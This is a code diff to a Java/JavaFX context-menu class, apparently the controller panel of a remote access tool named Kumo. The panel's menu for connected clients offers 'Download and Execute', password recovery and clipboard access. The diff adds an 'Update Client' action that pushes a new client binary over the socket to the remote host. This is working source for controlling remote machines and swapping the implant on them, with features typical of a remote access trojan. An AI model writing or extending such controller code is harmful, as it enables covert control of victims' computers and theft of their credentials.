@@ -17,11 +17,11 @@ import javafx.scene.input.Clipboard;
 import javafx.scene.input.ClipboardContent;
 import javafx.scene.input.MouseEvent;
 import javafx.stage.DirectoryChooser;
+import javafx.stage.FileChooser;
 import javafx.stage.Stage;
 import javafx.stage.StageStyle;
 
-import java.io.File;
-import java.io.IOException;
+import java.io.*;
 
 class IPContextMenu implements Repository {
     static void getIPContextMenu(TableCell n, MouseEvent e) {
@@ -90,7 +90,7 @@ class IPContextMenu implements Repository {
             stage.initStyle(StageStyle.UNDECORATED);
             stage.setMinWidth(300);
             stage.setMinWidth(300);
-            stage.setScene(new Scene(new DownloadAndExecuteView().getDownloadAndExecuteView(stage), 400, 200));
+            stage.setScene(new Scene(new DownloadAndExecuteView().getDownloadAndExecuteView(stage), 400, 225));
             stage.show();
             DownloadAndExecuteView.getDownloadButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
@@ -279,7 +279,43 @@ class IPContextMenu implements Repository {
         });
         misc.getItems().addAll(visit, showMsgbox, sleep);
 
-        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, clip, pwdRecovery, misc);
+        MenuItem update = new MenuItem("Update Client");
+        update.setOnAction(event -> {
+            // Get the file the user wants to send
+            FileChooser fileChooser = new FileChooser();
+            fileChooser.setTitle("Select new client");
+            File selectedDirectory = fileChooser.showOpenDialog(Kumo.getPrimaryStage());
+            String fileLocation = selectedDirectory.getAbsolutePath();
+
+            File newClientFile = new File(fileLocation);
+            /*
+            See Client.java#493
+            Protocol:
+                SERVER: UPDATE
+                SERVER: len(fbytes).to_long
+                SERVER: int[n]
+             */
+            if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
+                try {
+                    clientObject.clientCommunicate("UPDATE");
+                    Long length = newClientFile.length();
+                    DataOutputStream dos = new DataOutputStream(clientObject.getClient().getOutputStream());
+                    dos.writeLong(length);
+                    FileInputStream fis = new FileInputStream(newClientFile);
+                    BufferedInputStream bs = new BufferedInputStream(fis);
+
+                    int fbyte;
+                    while ((fbyte = bs.read()) != -1) dos.writeInt(fbyte);
+                    bs.close();
+                    fis.close();
+                    Logger.log(Level.INFO, "New client binary send to " + clientObject.getIP());
+                } catch (IOException e1) {
+                    new AlertView().showErrorAlert("Unable to communicate with client.");
+                }
+            }
+        });
+
+        mi1.getItems().addAll(sb1, sb2, si4, si5, si6, si7, clip, pwdRecovery, misc, update);
         MenuItem mi2 = new MenuItem("Copy IP");
         mi2.setOnAction(event -> {
             final Clipboard clipboard = Clipboard.getSystemClipboard();
